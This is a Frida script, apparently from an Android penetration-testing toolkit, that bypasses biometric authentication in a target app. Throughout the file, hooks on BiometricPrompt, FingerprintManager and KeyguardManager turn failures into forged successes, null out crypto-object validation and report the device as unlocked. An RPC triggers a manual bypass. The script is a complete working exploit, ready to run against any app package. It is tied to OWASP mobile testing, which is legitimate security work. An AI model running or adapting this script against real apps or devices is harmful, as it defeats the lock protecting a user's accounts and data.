/**
 * Universal Biometric Authentication Bypass — Sentinel
 * ======================================================
 * Supports: BiometricPrompt (Android 9+), androidx.biometric,
 *           FingerprintManager, FingerprintManagerCompat,
 *           FaceManager (Android 10+), KeyguardManager.
 *
 * Source: DragonJAR/Android-Pentesting-Skill (Apache 2.0), adapted for Sentinel.
 * Credits: ax/android-fingerprint-bypass, WithSecureLABS/android-keystore-audit
 *
 * Usage:
 *   frida -U -f com.target.app -l biometric-bypass.js
 *   For crypto-object bound apps: call bypass() RPC after prompt appears.
 *
 * OWASP MASTG: MASTG-TEST-0018, MASWE-0044
 */
Java.perform(function () {
    const CONFIG = { autoTrigger: true, bypassKeyguard: true, handleCryptoObject: true, verbose: false };
    let callbackG = null, authResultInst = null;

    const log = m => { if (CONFIG.verbose) console.log('[biometric] ' + m); };
    const ok  = m => console.log('[biometric][+] ' + m);
    const byp = m => console.log('[biometric][BYPASS] ' + m);

    // Dynamic constructor resolution across Android versions
    function buildAuthResult(cls, cryptoCls) {
        const cipher = null; // intentional — disables crypto-bound validation
        const co = cryptoCls.$new(cipher);
        for (const args of [[co,null,0,false],[co,null,0],[co,null],[co,0],[co]]) {
            try { return cls.$new(...args); } catch (_) {}
        }
        console.log('[biometric][!] Could not build AuthenticationResult');
        return null;
    }

    // ── androidx.biometric.BiometricPrompt ────────────────────────────
    try {
        const CB = Java.use('androidx.biometric.BiometricPrompt').AuthenticationCallback;
        CB.onAuthenticationFailed.implementation = function () {
            byp('androidx onAuthenticationFailed → success');
            try {
                const rc = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
                const cc = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
                const r = buildAuthResult(rc, cc);
                if (r) this.onAuthenticationSucceeded(r);
            } catch (e) { log('androidx auto-bypass error: ' + e); }
        };
        CB.onAuthenticationError.implementation = function (code, msg) {
            byp('androidx onAuthenticationError ' + code + ' → suppressed');
            return this.onAuthenticationError(code, msg);
        };
        ok('androidx.biometric.BiometricPrompt hooked');
    } catch (e) { log('androidx not found: ' + e); }

    // ── android.hardware.biometrics.BiometricPrompt ───────────────────
    try {
        const BP = Java.use('android.hardware.biometrics.BiometricPrompt');
        const rc = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
        const cc = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');

        BP.authenticate.overload('android.os.CancellationSignal','java.util.concurrent.Executor',
            'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback').implementation =
        function (sig, exec, cb) {
            ok('BiometricPrompt.authenticate (3-arg)');
            if (CONFIG.autoTrigger) {
                const r = buildAuthResult(rc, cc);
                if (r) { exec.execute(Java.registerClass({ name:'com.sentinel.bio.Runner'+Date.now(),
                    implements:[Java.use('java.lang.Runnable')],
                    methods:{run:function(){cb.onAuthenticationSucceeded(r);byp('3-arg success');}}}).$new()); return; }
            }
            return this.authenticate(sig, exec, cb);
        };

        BP.authenticate.overload('android.hardware.biometrics.BiometricPrompt$CryptoObject',
            'android.os.CancellationSignal','java.util.concurrent.Executor',
            'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback').implementation =
        function (crypto, sig, exec, cb) {
            ok('BiometricPrompt.authenticate (4-arg CryptoObject)');
            if (CONFIG.handleCryptoObject) { callbackG = Java.retain(cb); authResultInst = buildAuthResult(rc, cc); }
            if (CONFIG.autoTrigger && authResultInst) {
                exec.execute(Java.registerClass({ name:'com.sentinel.bio.Runner2'+Date.now(),
                    implements:[Java.use('java.lang.Runnable')],
                    methods:{run:function(){cb.onAuthenticationSucceeded(authResultInst);byp('4-arg crypto bypass');}}}).$new());
                return;
            }
            return this.authenticate(crypto, sig, exec, cb);
        };
        ok('android.hardware.biometrics.BiometricPrompt hooked');
    } catch (e) { log('HW BiometricPrompt error: ' + e); }

    // ── FingerprintManager (legacy) ───────────────────────────────────
    try {
        const FM = Java.use('android.hardware.fingerprint.FingerprintManager');
        const rc = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
        const cc = Java.use('android.hardware.fingerprint.FingerprintManager$CryptoObject');
        FM.authenticate.overload('android.hardware.fingerprint.FingerprintManager$CryptoObject',
            'android.os.CancellationSignal','int',
            'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback','android.os.Handler')
        .implementation = function (crypto, cancel, flags, cb, handler) {
            ok('FingerprintManager.authenticate');
            const r = buildAuthResult(rc, cc);
            if (CONFIG.autoTrigger && r) { cb.onAuthenticationSucceeded(r); byp('FingerprintManager bypass'); return; }
            return this.authenticate(crypto, cancel, flags, cb, handler);
        };
        ok('FingerprintManager hooked');
    } catch (e) { log('FingerprintManager: ' + e); }

    // ── KeyguardManager ───────────────────────────────────────────────
    if (CONFIG.bypassKeyguard) {
        try {
            const KM = Java.use('android.app.KeyguardManager');
            KM.isDeviceLocked.implementation = function () { byp('isDeviceLocked→false'); return false; };
            KM.isKeyguardSecure.implementation = function () { byp('isKeyguardSecure→false'); return false; };
            try { KM.createConfirmDeviceCredentialIntent.overload('java.lang.CharSequence','java.lang.CharSequence')
                .implementation = function () { byp('createConfirmDeviceCredentialIntent→null'); return null; }; } catch (_) {}
            ok('KeyguardManager hooked');
        } catch (e) { log('KeyguardManager: ' + e); }
    }

    // ── RPC for manual bypass ─────────────────────────────────────────
    rpc.exports = {
        bypass: function () {
            Java.perform(function () {
                if (!callbackG || !authResultInst) { console.log('[biometric][!] No stored callback — trigger prompt first'); return false; }
                try {
                    const H = Java.use('android.os.Handler');
                    const L = Java.use('android.os.Looper');
                    const h = H.$new(L.getMainLooper());
                    h.post(Java.registerClass({ name:'com.sentinel.bio.Manual'+Date.now(),
                        implements:[Java.use('java.lang.Runnable')],
                        methods:{run:function(){callbackG.onAuthenticationSucceeded(authResultInst);byp('manual bypass()');}}}).$new());
                    return true;
                } catch (e) { console.log('[biometric][!] Manual bypass failed: '+e); return false; }
            });
        },
        status: function () { return { hasCallback: callbackG !== null, hasResult: authResultInst !== null }; }
    };

    console.log('[biometric] Bypass loaded — BiometricPrompt/FingerprintManager/KeyguardManager');
});
